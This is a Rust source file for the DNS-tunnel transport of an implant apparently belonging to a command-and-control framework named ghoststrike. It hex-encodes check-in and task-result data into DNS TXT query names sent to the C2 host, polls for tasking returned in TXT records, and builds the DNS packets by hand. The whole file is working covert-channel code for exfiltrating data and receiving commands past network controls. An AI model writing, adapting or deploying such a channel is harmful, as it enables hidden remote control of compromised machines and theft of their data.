//! DNS tunnel transport.
//!
//! Protocol:
//!   Upload (agent→server): payload chunked into 29-byte pieces; each chunk sent as a TXT query:
//!     <2-hex-seq>.<58-hex-chunk>.<domain>
//!   After all chunks, agent sends a "done" query: `done.<total_hex_len>.<domain>`
//!   Server accumulates chunks and responds with the reply encoded in TXT records.
//!   Download (server→agent): agent polls `poll.<domain>` until TXT carries response payload.
//!
//! Raw DNS wire format is built manually (no external DNS crate needed in the agent).

use anyhow::{bail, Result};
use std::net::{SocketAddr, UdpSocket};
use std::time::Duration;
use uuid::Uuid;

use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, Task, TaskResultReq};
use crate::config::AgentConfig;

const TIMEOUT_MS: u64 = 3_000;
const CHUNK_SIZE: usize = 29;

pub struct DnsTransport {
    server_addr: SocketAddr,
    domain:      String,
}

impl DnsTransport {
    pub fn new(cfg: &AgentConfig) -> Result<Self> {
        let domain = cfg.dns_domain
            .clone()
            .unwrap_or_else(|| format!("c2.{}", cfg.c2_host));
        let server_addr: SocketAddr = format!("{}:53", cfg.c2_host).parse()?;
        Ok(Self { server_addr, domain })
    }

    fn send_payload(&self, payload: &[u8]) -> Result<Vec<u8>> {
        let sock = UdpSocket::bind("0.0.0.0:0")?;
        sock.set_read_timeout(Some(Duration::from_millis(TIMEOUT_MS)))?;

        let chunks: Vec<&[u8]> = payload.chunks(CHUNK_SIZE).collect();
        let total = chunks.len();

        for (seq, chunk) in chunks.iter().enumerate() {
            let chunk_hex = hex::encode(chunk);
            let seq_hex   = format!("{:02x}", seq);
            let qname     = format!("{seq_hex}.{chunk_hex}.{}", self.domain);
            let query     = build_dns_query(&qname, rand::random::<u16>());
            sock.send_to(&query, self.server_addr)?;
            // Brief gap to avoid reorder
            std::thread::sleep(Duration::from_millis(20));
        }

        // Send "done" marker
        let done_qname = format!("done.{:04x}.{}", total, self.domain);
        let query      = build_dns_query(&done_qname, rand::random::<u16>());
        sock.send_to(&query, self.server_addr)?;

        // Poll for response
        let poll_qname = format!("poll.{}", self.domain);
        for _ in 0..30 {
            let query = build_dns_query(&poll_qname, rand::random::<u16>());
            sock.send_to(&query, self.server_addr)?;

            let mut buf = [0u8; 4096];
            match sock.recv_from(&mut buf) {
                Ok((n, _)) => {
                    if let Some(txt) = extract_txt_rdata(&buf[..n]) {
                        if !txt.is_empty() && txt != b"ok" {
                            return hex::decode(txt).map_err(|e| anyhow::anyhow!("{e}"));
                        }
                    }
                }
                Err(_) => {}
            }
            std::thread::sleep(Duration::from_millis(500));
        }

        bail!("DNS poll timed out");
    }
}

#[async_trait::async_trait]
impl super::TransportInner for DnsTransport {
    async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp> {
        let body = serde_json::to_vec(req)?;
        // DNS is sync inside; run in spawn_blocking to not block the async runtime.
        let this_addr   = self.server_addr;
        let this_domain = self.domain.clone();
        let resp_bytes = tokio::task::spawn_blocking(move || {
            let t = DnsTransport { server_addr: this_addr, domain: this_domain };
            t.send_payload(&body)
        })
        .await??;
        Ok(serde_json::from_slice(&resp_bytes)?)
    }

    async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()> {
        let req = TaskResultReq { task_id: task.id, agent_id, output, success: true };
        let body = serde_json::to_vec(&req)?;
        let this_addr   = self.server_addr;
        let this_domain = self.domain.clone();
        tokio::task::spawn_blocking(move || {
            let t = DnsTransport { server_addr: this_addr, domain: this_domain };
            t.send_payload(&body)
        })
        .await??;
        Ok(())
    }
}

// ── Minimal DNS wire format ───────────────────────────────────────────────────

fn build_dns_query(qname: &str, tx_id: u16) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    // Header
    buf.extend_from_slice(&tx_id.to_be_bytes());
    buf.extend_from_slice(&[0x01, 0x00]); // flags: recursion desired
    buf.extend_from_slice(&[0x00, 0x01]); // QDCOUNT=1
    buf.extend_from_slice(&[0x00, 0x00]); // ANCOUNT=0
    buf.extend_from_slice(&[0x00, 0x00]); // NSCOUNT=0
    buf.extend_from_slice(&[0x00, 0x00]); // ARCOUNT=0
    // QNAME
    encode_qname(qname, &mut buf);
    // QTYPE=TXT(16), QCLASS=IN(1)
    buf.extend_from_slice(&[0x00, 0x10, 0x00, 0x01]);
    buf
}

fn encode_qname(name: &str, buf: &mut Vec<u8>) {
    for label in name.split('.') {
        let label_bytes = label.as_bytes();
        let len = label_bytes.len().min(63) as u8;
        buf.push(len);
        buf.extend_from_slice(&label_bytes[..len as usize]);
    }
    buf.push(0x00); // root label
}

/// Extract the first TXT RDATA from a DNS response.
fn extract_txt_rdata(resp: &[u8]) -> Option<Vec<u8>> {
    if resp.len() < 12 { return None; }
    let ancount = u16::from_be_bytes([resp[6], resp[7]]) as usize;
    if ancount == 0 { return None; }

    // Skip header (12) + question section (variable — scan for end)
    let mut pos = 12;
    // Skip QNAME
    while pos < resp.len() {
        let len = resp[pos] as usize;
        pos += 1;
        if len == 0 { break; }
        if len & 0xC0 == 0xC0 { pos += 1; break; } // compression pointer
        pos += len;
    }
    pos += 4; // QTYPE + QCLASS

    // Parse first answer
    if pos >= resp.len() { return None; }
    // Skip NAME (may be compressed)
    if resp[pos] & 0xC0 == 0xC0 { pos += 2; } else {
        while pos < resp.len() {
            let len = resp[pos] as usize;
            pos += 1;
            if len == 0 { break; }
            pos += len;
        }
    }
    if pos + 10 > resp.len() { return None; }
    let rtype  = u16::from_be_bytes([resp[pos], resp[pos+1]]);
    let rdlen  = u16::from_be_bytes([resp[pos+8], resp[pos+9]]) as usize;
    pos += 10;
    if rtype != 16 { return None; } // TXT
    if pos + rdlen > resp.len() { return None; }
    // TXT RDATA: 1-byte length + string
    let txt_len = resp[pos] as usize;
    if pos + 1 + txt_len > resp.len() { return None; }
    Some(resp[pos+1..pos+1+txt_len].to_vec())
}
